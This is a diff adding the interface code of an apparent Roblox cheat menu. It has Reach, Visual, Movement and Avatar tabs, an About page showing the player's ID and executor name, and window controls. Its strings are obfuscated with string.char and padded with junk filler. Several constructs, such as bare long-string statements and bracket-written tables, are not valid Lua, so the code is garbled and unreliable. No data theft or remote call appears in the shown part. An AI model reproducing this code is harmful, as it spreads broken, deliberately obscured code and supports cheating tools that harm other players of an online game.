+    local userBase=frame({Size=UDim2.new(1,0,1,0),BackgroundColor3=Color3.fromRGB(28,22,60),BorderSizePixel=0,Parent=userWrap}); corner(userBase,isMobile and 14 or 12)
+    local uGrad=Instance.new((function() return string.char(0x55, 0x49, 0x47, 0x72, 0x61, 0x64, 0x69, 0x65, 0x6e, 0x74) end)()); uGrad.Color=ColorSequence.new(Color3.fromRGB(40,30,100),Color3.fromRGB(18,14,36)); uGrad.Rotation=0; uGrad.Transparency=NumberSequence.new(0.2); uGrad.Parent=userBase
+[==[ _1ca9a7_ ]==]
+    cardGlow(userBase,CFG.C.Accent); stroke(userBase,Color3.fromRGB(45,35,90),1,0.55)
+do local __a5e7be_=nil end
+    local usrIcon=frame({Size=UDim2.new(0,isMobile and 42 or 34,0,isMobile and 42 or 34),AnchorPoint=Vector2.new(0,.5),Position=UDim2.new(0,isMobile and 14 or 12,.5,0),BackgroundColor3=Color3.fromRGB(38,28,100),BorderSizePixel=0,ZIndex=3,Parent=userBase}); corner(usrIcon,isMobile and 21 or 17)
+do local _qvzq_5f30=nil end
+    label({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text=string.sub(LocalPlayer.DisplayName,1,1):upper(),TextColor3=Color3.fromRGB(180,160,255),Font=F.Title,TextSize=isMobile and 20 or 16,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,ZIndex=4,Parent=usrIcon})
+    label({Size=UDim2.new(1,-(isMobile and 70 or 62),0,isMobile and 22 or 18),Position=UDim2.new(0,isMobile and 60 or 54,0,isMobile and 10 or 9),BackgroundTransparency=1,Text=LocalPlayer.DisplayName,TextColor3=Color3.fromRGB(230,220,255),Font=F.Bold,TextSize=isMobile and 16 or 13,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=3,Parent=userBase})
+if false then local phbqi_128f=7819 end
+    label({Size=UDim2.new(1,-(isMobile and 70 or 62),0,isMobile and 18 or 14),Position=UDim2.new(0,isMobile and 60 or 54,0,isMobile and 34 or 29),BackgroundTransparency=1,Text=(function() return string.char(73, 68, 58, 32) end)()..tostring(LocalPlayer.UserId),TextColor3=Color3.fromRGB(100,80,180),Font=F.Mono,TextSize=isMobile and 12 or 10,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=3,Parent=userBase})
+    local card1=makeSection(sf,(function() local t=[73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),2)
+    local function infoRow(k,v,ord)
+        local r=makeRow(card1,isMobile and 44 or 38,ord)
+        label({Size=UDim2.new(.5,0,1,0),BackgroundTransparency=1,Text=k,TextColor3=CFG.C.SubText,Font=F.Body,TextSize=isMobile and 14 or 12,TextXAlignment=Enum.TextXAlignment.Left,Parent=r})
+        label({Size=UDim2.new(.5,0,1,0),Position=UDim2.new(.5,0,0,0),BackgroundTransparency=1,Text=v,TextColor3=CFG.C.Text,Font=F.Bold,TextSize=isMobile and 14 or 12,TextXAlignment=Enum.TextXAlignment.Right,Parent=r})
+    end
+do local __d27c7e_=nil end
+    infoRow((function() return string.char(0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e) end)(),CFG.Version,1); rowDivider(card1,2)
+    infoRow((function() return string.char(80, 108, 97, 121, 101, 114) end)(),LocalPlayer.Name,3); rowDivider(card1,4)
+    infoRow((function() local t=[85, 115, 101, 114, 32, 73, 68] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),tostring(LocalPlayer.UserId),5); rowDivider(card1,6)
+[==[ _1b7ce6_ ]==]
+    infoRow((function() return string.char(0x50, 0x6c, 0x61, 0x63, 0x65, 0x49, 0x64) end)(),tostring(game.PlaceId),7); rowDivider(card1,8)
+if false then local _66690c_=2474 end
+    infoRow((function() return string.char(68, 101, 118, 105, 99, 101) end)(),UserInputService.TouchEnabled and (function() local t=[77, 111, 98, 105, 108, 101] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)() or (function() return string.char(0x50, 0x43) end)(),9); rowDivider(card1,10)
+    infoRow((function() return string.char(69, 120, 101, 99, 117, 116, 111, 114) end)(),identifyexecutor and identifyexecutor() or (function() local t=[68, 101, 102, 97, 117, 108, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),11)
+if false then local vifarexe5Ik=5825 end
+    local lWrap=frame({Size=UDim2.new(1,0,0,isMobile and 48 or 40),BackgroundTransparency=1,LayoutOrder=3,Parent=sf})
+    local lBase=frame({Size=UDim2.new(1,0,1,0),BackgroundColor3=Color3.fromRGB(26,20,60),BorderSizePixel=0,Parent=lWrap}); corner(lBase,isMobile and 12 or 10)
+    local lGrad=Instance.new((function() return string.char(0x55, 0x49, 0x47, 0x72, 0x61, 0x64, 0x69, 0x65, 0x6e, 0x74) end)()); lGrad.Color=ColorSequence.new(Color3.fromRGB(38,28,100),Color3.fromRGB(16,12,38)); lGrad.Rotation=0; lGrad.Transparency=NumberSequence.new(0.3); lGrad.Parent=lBase
+    cardGlow(lBase,CFG.C.Accent); stroke(lBase,Color3.fromRGB(42,32,90),1,0.55)
+    label({Size=UDim2.new(1,-20,1,0),Position=UDim2.new(0,14,0,0),BackgroundTransparency=1,Text=(function() return string.char(76, 105, 110, 107, 115, 32, 38, 32, 83, 117, 112, 112, 111, 114, 116) end)(),TextColor3=Color3.fromRGB(130,110,240),Font=F.Bold,TextSize=isMobile and 15 or 12,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=3,Parent=lBase})
+    local card2=makeSection(sf,(function() local t=[67, 114, 101, 100, 105, 116, 115] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),4)
+    local function creditRow(name,role,user,ord)
+        local r=makeRow(card2,isMobile and 50 or 42,ord)
+        local av=frame({Size=UDim2.new(0,isMobile and 34 or 28,0,isMobile and 34 or 28),AnchorPoint=Vector2.new(0,.5),Position=UDim2.new(0,0,.5,0),BackgroundColor3=CFG.C.Accent,BackgroundTransparency=0.5,BorderSizePixel=0,Parent=r}); corner(av,isMobile and 17 or 14)
+        label({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text=string.sub(name,1,1):upper(),TextColor3=CFG.C.Text,Font=F.Bold,TextSize=isMobile and 16 or 12,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Parent=av})
+        label({Size=UDim2.new(1,-(isMobile and 44 or 40),0,isMobile and 20 or 16),Position=UDim2.new(0,isMobile and 40 or 36,.5,-(isMobile and 20 or 16)),BackgroundTransparency=1,Text=name,TextColor3=CFG.C.Text,Font=F.Bold,TextSize=isMobile and 15 or 12,TextXAlignment=Enum.TextXAlignment.Left,Parent=r})
+        label({Size=UDim2.new(1,-(isMobile and 44 or 40),0,isMobile and 18 or 14),Position=UDim2.new(0,isMobile and 40 or 36,.5,isMobile and 4 or 2),BackgroundTransparency=1,Text=role .. (user and (function() return string.char(0x20, 0x20, 0x40) end)()..user or ""),TextColor3=CFG.C.SubText,Font=F.Body,TextSize=isMobile and 13 or 11,TextXAlignment=Enum.TextXAlignment.Left,Parent=r})
+    end
+    creditRow((function() return string.char(71, 108, 111, 114, 102, 105, 110, 100, 101, 108) end)(),(function() local t=[77, 97, 105, 110, 32, 68, 101, 118, 101, 108, 111, 112, 101, 114, 32, 38, 32, 68, 101, 115, 105, 103, 110, 101, 114] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),(function() return string.char(0x63, 0x78, 0x72, 0x74, 0x61, 0x67, 0x65, 0x6e, 0x61) end)(),1)
+    rowDivider(card2,2)
+do local __3c0680_=nil end
+    creditRow((function() return string.char(97, 105, 109, 110, 122) end)(),(function() local t=[67, 111, 45, 68, 101, 118, 101, 108, 111, 112, 101, 114] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),(function() return string.char(0x61, 0x69, 0x6d, 0x6e, 0x7a, 0x71) end)(),3)
+if false then local abhuu_f04f=614 end
+    rowDivider(card2,4)
+    creditRow((function() return string.char(76, 101, 120, 105) end)(),(function() local t=[67, 111, 110, 116, 114, 105, 98, 117, 116, 111, 114] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),(function() return string.char(0x78, 0x39, 0x72, 0x7a) end)(),5)
+end
+
+local PAGE_BUILDERS={buildReach,buildVisual,buildLegVisual,buildMovement,buildAvatar,buildMisc,buildAbout}
+
+for i,tab in ipairs(CFG.Tabs) do
+    local page=frame({Name=tab.Name,Size=UDim2.new(1,0,1,0),Position=UDim2.new(i==1 and 0 or 1,0,0,0),BackgroundTransparency=1,Visible=(i==1),Parent=PageArea})
+    if PAGE_BUILDERS[i] then PAGE_BUILDERS[i](page) end; Pages[i]=page
+    local tbtn=Instance.new((function() return string.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110) end)()); 
+if false then local pmjaxli_2c44=6779 end
+    tbtn.Size=UDim2.new(1,0,0,isMobile and 44 or 36); 
+    tbtn.BackgroundColor3=(i==1) and CFG.C.ActiveBg or Color3.fromRGB(0,0,0); 
+    tbtn.BackgroundTransparency=(i==1) and .3 or 1; 
+    tbtn.BorderSizePixel=0; 
+    tbtn.Text=""; 
+do local _dedukiGoI=nil end
+    tbtn.AutoButtonColor=false; 
+if false then local qibl_d429=9241 end
+    tbtn.LayoutOrder=i+1; 
+    tbtn.ZIndex=5; 
+    tbtn.Parent=SBScroll; 
+    corner(tbtn,isMobile and 10 or 8)
+[==[ kfvmqd_1cf2 ]==]
+    local iH=frame({Size=UDim2.new(0,isMobile and 22 or 18,0,isMobile and 22 or 18),AnchorPoint=Vector2.new(0,.5),Position=UDim2.new(0,isMobile and 8 or 7,.5,0),BackgroundTransparency=1,ZIndex=6,Parent=tbtn})
+    if ICON_FNS[i] then ICON_FNS[i](iH) end
+[==[ _75e61_ ]==]
+    local tlbl=label({Name=(function() local t=[76, 97, 98, 101, 108] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),Size=UDim2.new(1,-(isMobile and 38 or 34),1,0),Position=UDim2.new(0,isMobile and 36 or 32,0,0),BackgroundTransparency=1,Text=tab.Name,TextColor3=(i==1) and CFG.C.Text or CFG.C.SubText,Font=F.Body,TextSize=isMobile and 15 or 13,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=6,Parent=tbtn})
+    TabRefs[i]={Btn=tbtn,IconHolder=iH,Label=tlbl}
+    tbtn.MouseButton1Click:Connect(function()
+if false then local runujivesMG5=8343 end
+        if State.ActiveTab==i then return end
+do local _tigidinoQcHa=nil end
+        local prev=TabRefs[State.ActiveTab]; local prevIdx=State.ActiveTab; local dir=(i>prevIdx) and 1 or -1
+[==[ xoedybdr_7daa ]==]
+        local prevPage=Pages[prevIdx]
+        tw(prevPage,{Position=UDim2.new(-dir*0.25,0,0,0),BackgroundTransparency=1},.22,Enum.EasingStyle.Quart,Enum.EasingDirection.In)
+        task.delay(.22,function() prevPage.Visible=false; prevPage.Position=UDim2.new(dir,0,0,0) end)
+        local nextPage=Pages[i]; nextPage.Position=UDim2.new(dir*0.3,0,0,0); nextPage.Visible=true
+        tw(nextPage,{Position=UDim2.new(0,0,0,0)},.28,Enum.EasingStyle.Quart,Enum.EasingDirection.Out)
+        tw(prev.Btn,{BackgroundTransparency=1},.2); prev.Label.TextColor3=CFG.C.SubText
+        for _,c in ipairs(prev.IconHolder:GetChildren()) do if c:IsA((function() return string.char(0x46, 0x72, 0x61, 0x6d, 0x65) end)()) then tw(c,{BackgroundColor3=CFG.C.SubText},.2) end end
+        State.ActiveTab=i; tw(tbtn,{BackgroundTransparency=.3},.2); tlbl.TextColor3=CFG.C.Text
+        for _,c in ipairs(iH:GetChildren()) do if c:IsA((function() return string.char(70, 114, 97, 109, 101) end)()) then tw(c,{BackgroundColor3=CFG.C.Text},.2) end end
+    end)
+do local __3ace97_=nil end
+    tbtn.MouseEnter:Connect(function() if State.ActiveTab~=i then tw(tbtn,{BackgroundTransparency=.6},.15) end end)
+    tbtn.MouseLeave:Connect(function() if State.ActiveTab~=i then tw(tbtn,{BackgroundTransparency=1},.15) end end)
+end
+
+[==[ _7f30bf_ ]==]
+do for _,c in ipairs(TabRefs[1].IconHolder:GetChildren()) do if c:IsA((function() local t=[70, 114, 97, 109, 101] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()) then c.BackgroundColor3=CFG.C.Text end end end
+
+TogBtn.MouseButton1Click:Connect(function()
+if false then local ruxoXHW1=8579 end
+    State.SidebarOpen=not State.SidebarOpen
+    local newW=State.SidebarOpen and CFG.SidebarExp or CFG.SidebarCol
+    tw(Sidebar,{Size=UDim2.new(0,newW,1,0)},.3); tw(PageArea,{Position=UDim2.new(0,newW,0,0),Size=UDim2.new(0,W-newW,1,0)},.3)
+    local tt=State.SidebarOpen and 0 or 1
+    for _,r in ipairs(TabRefs) do tw(r.Label,{TextTransparency=tt},.2) end
+[==[ _4809ec_ ]==]
+    tw(TogLabel,{TextTransparency=tt},.2); TogLabel.Text=State.SidebarOpen and (function() return string.char(0x43, 0x6f, 0x6c, 0x6c, 0x61, 0x70, 0x73, 0x65) end)() or (function() return string.char(69, 120, 112, 97, 110, 100) end)()
+[==[ puzenireik ]==]
+end)
+TogBtn.MouseEnter:Connect(function() tw(TogBtn,{BackgroundTransparency=.45},.15) end)
+TogBtn.MouseLeave:Connect(function() tw(TogBtn,{BackgroundTransparency=.7},.15) end)
+
+[==[ vinuWZlBX ]==]
+TBar.InputBegan:Connect(function(inp)
+[==[ _ac90a4_ ]==]
+    if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then 
+        State.Dragging=true; 
+        State.DragStart=inp.Position; 
+[==[ zelilufaKbu ]==]
+        State.StartPos=Main.Position 
+    end
+end)
+[==[ tzwtjv_0b72 ]==]
+UserInputService.InputChanged:Connect(function(inp)
+if false then local kalawohi5MH=8757 end
+    if State.Dragging and (inp.UserInputType==Enum.UserInputType.MouseMovement or inp.UserInputType==Enum.UserInputType.Touch) then
+        local d=inp.Position-State.DragStart
+        Main.Position=UDim2.new(State.StartPos.X.Scale,State.StartPos.X.Offset+d.X,State.StartPos.Y.Scale,State.StartPos.Y.Offset+d.Y)
+    end
+[==[ gocegepiWL8 ]==]
+end)
+UserInputService.InputEnded:Connect(function(inp) 
+if false then local widabitoT=7769 end
+    if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then 
+        State.Dragging=false 
+    end 
+end)
+
+do local _mkiuniqd_2045=nil end
+BtnClose.MouseButton1Click:Connect(function()
+    tw(Main,{BackgroundTransparency=1,Size=UDim2.new(0,W,0,H*.92)},.3,Enum.EasingStyle.Quart)
+    task.delay(.35,function() ScreenGui:Destroy() end)
+[==[ _78677d_ ]==]
+end)
+BtnMinimize.MouseButton1Click:Connect(function()
+if false then local nofopoxj=8614 end
+    State.Minimized=not State.Minimized
+do local _jisuvoFHa=nil end
+    if State.Minimized then tw(Main,{Size=UDim2.new(0,W,0,isMobile and 50 or 44)},.28,Enum.EasingStyle.Quart)
+    else tw(Main,{Size=UDim2.new(0,W,0,H)},.4,Enum.EasingStyle.Back,Enum.EasingDirection.Out) end
+[==[ _1a7866_ ]==]
+end)
+local maximized=false
+BtnMaximize.MouseButton1Click:Connect(function()
+    maximized=not maximized
+    if maximized then tw(Main,{Size=UDim2.new(.93,0,.9,0),Position=UDim2.new(.035,0,.05,0)},.35)
+    else tw(Main,{Size=UDim2.new(0,W,0,H),Position=UDim2.new(.5,-W/2,.5,-H/2)},.35,Enum.EasingStyle.Back,Enum.EasingDirection.Out) end
+end)
+
+UserInputService.InputBegan:Connect(function(input,gpe) 
+do local _ooieny_62f3=nil end
+    if gpe then return end; 
+    if input.KeyCode==Enum.KeyCode.Insert then 
+[==[ _a62b4_ ]==]
+        State.Minimized=not State.Minimized; 
+        if State.Minimized then 
+            tw(Main,{Size=UDim2.new(0,W,0,isMobile and 50 or 44)},.28,Enum.EasingStyle.Quart) 
+do local __6d50e7_=nil end
+        else 
+            tw(Main,{Size=UDim2.new(0,W,0,H)},.4,Enum.EasingStyle.Back,Enum.EasingDirection.Out) 
+        end 
+do local _sudoze3P=nil end
+    end 
+end)
+
+if false then local qenuqicizpw=2258 end
+Main.BackgroundTransparency=1; Main.Size=UDim2.new(0,W,0,H*.88); Main.Position=UDim2.new(.5,-W/2,.5,-H/2+28)
+[==[ _5d28fe_ ]==]
+task.delay(.06,function()
+do local __da545b_=nil end
+    tw(Main,{BackgroundTransparency=0.08,Size=UDim2.new(0,W,0,H),Position=UDim2.new(.5,-W/2,.5,-H/2)},.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
+[==[ liweAnQsr ]==]
+end)
+task.delay(.7,function() toast((function() local t=[87, 101, 108, 99, 111, 109, 101, 33] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),CFG.Name..(function() return string.char(0x20) end)()..CFG.Version..(function() return string.char(32, 108, 111, 97, 100, 101, 100, 46) end)(),CFG.C.Accent) end)
+do local __94a6de_=nil end
